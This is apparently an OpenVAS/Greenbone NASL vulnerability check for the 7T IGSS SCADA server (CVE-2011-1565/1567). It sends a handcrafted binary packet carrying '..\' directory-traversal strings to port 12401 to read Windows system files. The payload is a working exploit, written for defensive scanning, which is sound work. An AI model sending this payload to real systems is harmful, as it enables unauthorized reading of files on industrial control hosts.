if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103128" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2011-03-28 13:42:17 +0200 (Mon, 28 Mar 2011)" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_cve_id( "CVE-2011-1565", "CVE-2011-1567" );
	script_bugtraq_id( 46936 );
	script_name( "7T Interactive Graphical SCADA System Multiple Security Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_family( "General" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "os_detection.sc" );
	script_require_ports( 12401 );
	script_mandatory_keys( "Host/runs_windows" );
	script_xref( name: "URL", value: "https://www.securityfocus.com/bid/46936" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/517080" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/17300/" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/17024/" );
	script_xref( name: "URL", value: "http://aluigi.org/adv/igss_1-adv.txt" );
	script_xref( name: "URL", value: "http://aluigi.org/adv/igss_2-adv.txt" );
	script_xref( name: "URL", value: "http://aluigi.org/adv/igss_3-adv.txt" );
	script_xref( name: "URL", value: "http://aluigi.org/adv/igss_4-adv.txt" );
	script_xref( name: "URL", value: "http://aluigi.org/adv/igss_5-adv.txt" );
	script_xref( name: "URL", value: "http://aluigi.org/adv/igss_6-adv.txt" );
	script_xref( name: "URL", value: "http://aluigi.org/adv/igss_7-adv.txt" );
	script_xref( name: "URL", value: "http://aluigi.org/adv/igss_8-adv.txt" );
	script_tag( name: "summary", value: "7T Interactive Graphical SCADA System is prone to multiple security
  vulnerabilities." );
	script_tag( name: "impact", value: "Exploiting these issues may allow remote attackers to execute arbitrary
  code within the context of the affected application or perform unauthorized actions using directory traversal strings." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this
  vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable
  respective features, remove the product or replace the product by another one." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
port = 12401;
if(!get_port_state( port )){
	exit( 0 );
}
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
files = traversal_files( "Windows" );
for pattern in keys( files ) {
	ex = raw_string( 0x9b, 0x00, 0x01, 0x00, 0x34, 0x12, 0x0d, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00 );
	ex += crap( data: raw_string( 0x2e, 0x2e, 0x5c ), length: 48 );
	file = files[pattern];
	pattern = str_replace( find: "\\[", string: file, replace: "[" );
	pattern = str_replace( find: "\\]", string: file, replace: "]" );
	pattern = str_replace( find: "supporT", string: file, replace: "support" );
	ex += NASLString( file );
	ex += crap( data: raw_string( 0x00 ), length: 77 );
	send( socket: soc, data: ex );
	res = recv( socket: soc, length: 8072 );
	if(ContainsString( res, pattern )){
		close( soc );
		security_message( port: port );
		exit( 0 );
	}
}
close( soc );
exit( 0 );

